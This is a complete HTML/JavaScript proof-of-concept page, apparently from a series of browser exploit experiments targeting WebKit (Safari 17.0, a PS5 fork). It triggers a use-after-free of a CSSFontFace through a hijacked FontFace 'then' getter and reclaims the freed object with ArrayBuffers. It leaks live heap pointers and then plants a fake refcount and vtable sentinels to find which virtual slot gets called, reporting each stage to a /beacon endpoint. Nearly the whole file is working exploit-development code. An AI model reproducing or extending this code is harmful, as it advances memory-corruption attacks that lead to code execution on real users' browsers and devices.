<!--
  p578: Vtable Slot Discrimination (settles Issue #179 Contradiction C3).
  
  Determines whether virtual dispatch calls fontStateChanged at vtable+0x18 (Layout A,
  Safari 17.0 / PS5-14.00-fork) or vtable+0x28 (Layout B, post-2024 AbstractRefCounted).
  
  Method:
    Two-stage template based on p564.
    Stage 1: Leak live heap pointers p58 and p68 from 192-byte CSSFontFace reclaim.
    Stage 2: Armed with sentinels across all 8 vtable slots (0x00 .. 0x38).
             Each slot contains 0x414141410000 + slot_offset.
             Crash RIP directly discriminates which vtable slot fired.
-->
<!DOCTYPE html><html><head><meta charset="utf-8"><title>p578 vtable slot discrimination</title>
<script>
function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+encodeURIComponent(m)+'?t='+Date.now(),false);x.send(null);}catch(e){}}
var K=8, SIZE=192, styleEl=null, firedHere=false, stage=0, leaked={p58:null,p68:null};
function hex(v){return ('0' + v.toString(16)).slice(-2);}
function grab(view, off){ var a=[]; for(var i=0;i<8;i++) a.push(view[off+i]); return a; }

function writeQ(view, off, lo, hi){
  view[off]   = lo & 0xFF;         view[off+1] = (lo >> 8) & 0xFF;
  view[off+2] = (lo >> 16) & 0xFF; view[off+3] = (lo >> 24) & 0xFF;
  view[off+4] = hi & 0xFF;         view[off+5] = (hi >> 8) & 0xFF;
  view[off+6] = (hi >> 16) & 0xFF; view[off+7] = (hi >> 24) & 0xFF;
}

function setupFace(name, css){
  styleEl = document.createElement('style');
  styleEl.textContent = css;
  document.head.appendChild(styleEl);
  var A = new FontFace(name, 'local(Helvetica)', { unicodeRange: 'U+0041' });
  document.fonts.add(A); void A.loaded; window.__alive.push(A);
}

function installGetter(){
  firedHere = false;
  Object.defineProperty(FontFace.prototype, 'then', {
    configurable: true,
    get: function(){
      if (firedHere) return undefined;
      firedHere = true;
      if (styleEl) styleEl.remove();
      try { document.fonts.delete(this); } catch (e) {}
      document.body.offsetHeight;
      window.__map = [];
      for (var k = 0; k < K; k++) {
        var ab = new ArrayBuffer(SIZE);
        var v = new Uint8Array(ab);
        if (stage === 1 && leaked.p58) {
          // Refcount = 2 (natural refcount law 7)
          v[0] = 2; v[1] = 0; v[2] = 0; v[3] = 0;
          // Restore live engine pointers at +0x58 and +0x68
          v.set(leaked.p58, 0x58);
          v.set(leaked.p68, 0x68);

          // Populate sentinel table in lane (distinct value per slot):
          // slot 0 (+0x00): complete dtor -> 0x414141410000
          // slot 1 (+0x08): deleting dtor -> 0x414141410008
          // slot 2 (+0x10): fontLoaded    -> 0x414141410010
          // slot 3 (+0x18): fontStateChgA -> 0x414141410018 (TARGET Layout A)
          // slot 4 (+0x20): propertyChg   -> 0x414141410020
          // slot 5 (+0x28): fontStateChgB -> 0x414141410028 (TARGET Layout B)
          // slot 6 (+0x30): updateStyle   -> 0x414141410030
          // slot 7 (+0x38): sentinel      -> 0x414141410038
          for (var s = 0; s < 8; s++) {
            writeQ(v, 0x10 + (s * 8), (s * 8), 0x41414141);
          }
        }
        window.__map.push({ size: SIZE, view: v });
      }
      try { document.fonts.check('1em s0'); } catch (e) {}
      return undefined;
    },
    set: function(){}
  });
}

function start(){
  window.__alive = [];
  stage = 0;
  setupFace('f0', "@font-face { font-family: s0; src: local(Arial); unicode-range: U+0042; }");
  installGetter();
  b('P578-SETUP');
  document.fonts.load('1em f0, s0', 'AB').then(
    function(){ b('P578-S1-RESOLVED'); },
    function(){ b('P578-S1-REJECTED'); }
  );
  setTimeout(scan1, 120);
}

function scan1(){
  var m = window.__map || [], best = -1, nz = 0;
  for (var i = 0; i < m.length; i++) {
    var v = m[i].view, n = 0;
    for (var j = 0; j < v.length; j++) if (v[j] !== 0) n++;
    if (n > nz) { nz = n; best = i; }
  }
  if (best < 0) { b('P578-S1-CLEAN'); return; }
  var v = m[best].view;
  leaked.p58 = grab(v, 0x58); leaked.p68 = grab(v, 0x68);
  var s = ''; for (var j = 0; j < v.length; j++) if (v[j] !== 0) s += hex(v[j]);
  b('P578-S1-HIT-b' + best + '-n' + nz + '-' + s);

  stage = 1;
  setupFace('f1', "@font-face { font-family: s1; src: local(Arial); unicode-range: U+0043; }");
  installGetter();
  b('P578-S2-SENTINELS-ARMED');
  document.fonts.load('1em f1, s1', 'AB').then(
    function(){ b('P578-S2-RESOLVED'); },
    function(){ b('P578-S2-REJECTED'); }
  );
  setTimeout(function(){ b('P578-S2-ALIVE-' + (firedHere ? 1 : 0)); }, 600);
}

function run(){ start(); }
if (document.readyState === 'complete' || document.readyState === 'interactive') setTimeout(run, 0);
else document.addEventListener('DOMContentLoaded', run);
</script></head><body><p>p578 vtable slot discrimination</p></body></html>
